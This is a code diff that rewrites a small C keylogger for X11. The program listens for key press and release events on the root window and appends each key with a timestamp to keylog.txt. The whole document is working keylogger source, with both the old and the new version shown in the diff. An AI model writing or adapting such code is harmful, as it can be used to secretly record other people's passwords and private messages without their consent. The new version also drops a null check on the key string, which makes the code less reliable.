@@ -1,31 +1,45 @@
 #include <X11/Xlib.h>
-#include <X11/Xutil.h>  // For XLookupString
 #include <X11/keysym.h>
+#include <X11/Xutil.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <time.h>
+#include <unistd.h>
 
-FILE *log_file;
+// Function to log key events to a file
+void log_key(const char *event, const char *key) {
+    FILE *logfile = fopen("keylog.txt", "a");
+    if (logfile == NULL) {
+        perror("Error opening log file");
+        exit(1);
+    }
 
-void log_key(const char *event_type, const char *key) {
-    // Print to console
-    printf("%s: %s\n", event_type, key);
-    
-    // Log to file
-    fprintf(log_file, "%s: %s\n", event_type, key);
-    fflush(log_file);  // Ensure it's immediately written to file
+    // Get current timestamp
+    time_t now = time(NULL);
+    struct tm *timeinfo = localtime(&now);
+
+    // Write timestamp and key event to the log
+    fprintf(logfile, "%02d-%02d-%04d %02d:%02d:%02d - %s: %s\n", 
+        timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900,
+        timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec, event, key);
+
+    fclose(logfile);
 }
 
-char* get_key_string(XKeyEvent *event, Display *display) {
+// Function to get a string representation of the key
+char* get_key_string(XKeyEvent *event) {
     static char buf[128];
     KeySym keysym;
-    int len = XLookupString(event, buf, sizeof(buf), &keysym, NULL);  // Convert keypress to string
+    int len;
+
+    // Use XLookupString instead of Xutf8LookupString for simplicity
+    len = XLookupString(event, buf, sizeof(buf), &keysym, NULL);
 
     if (len > 0) {
-        buf[len] = '\0';  // Null-terminate the string
+        buf[len] = '\0';
         return buf;
     } else {
-        return XKeysymToString(keysym);  // Handle special keys (like arrows, function keys)
+        return XKeysymToString(keysym);
     }
 }
 
@@ -34,48 +48,32 @@ int main() {
     Window root;
     XEvent event;
 
-    display = XOpenDisplay(NULL);  // Open connection to X server
+    // Open connection to X server
+    display = XOpenDisplay(NULL);
     if (display == NULL) {
-        fprintf(stderr, "Unable to open X display\n");
+        fprintf(stderr, "Cannot open display\n");
         exit(1);
     }
 
-    root = DefaultRootWindow(display);  // Get the root window
+    root = DefaultRootWindow(display);
 
-    // Open log file for writing
-    log_file = fopen("keylog.txt", "a");
-    if (log_file == NULL) {
-        fprintf(stderr, "Unable to open log file\n");
-        exit(1);
-    }
+    // Select input events for the root window
+    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);
 
-    time_t current_time = time(NULL);
-    fprintf(log_file, "Keylogger started at %s\n", ctime(&current_time));
-    fflush(log_file);  // Write immediately
+    printf("Keylogger started. You can use the keyboard.\n");
 
-    // Only listen for keyboard events, without grabbing the entire keyboard
-    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);  // Listen for key events globally
-
-    printf("Keylogger started. The keyboard can still be used by the user.\n");
-
+    // Main loop to capture key events
     while (1) {
-        XNextEvent(display, &event);  // Wait for the next event
+        XNextEvent(display, &event);
         if (event.type == KeyPress) {
-            char *key = get_key_string(&event.xkey, display);  // Get key string
-            if (key != NULL) {
-                log_key("Key Pressed", key);  // Log key press
-            }
-        }
-        if (event.type == KeyRelease) {
-            char *key = get_key_string(&event.xkey, display);  // Get key string
-            if (key != NULL) {
-                log_key("Key Released", key);  // Log key release
-            }
+            char *key = get_key_string(&event.xkey);
+            log_key("Key Pressed", key);
+        } else if (event.type == KeyRelease) {
+            char *key = get_key_string(&event.xkey);
+            log_key("Key Released", key);
         }
     }
 
-    // Close log file on exit
-    fclose(log_file);
-    XCloseDisplay(display);  // Close connection to X server
+    XCloseDisplay(display);
     return 0;
 }
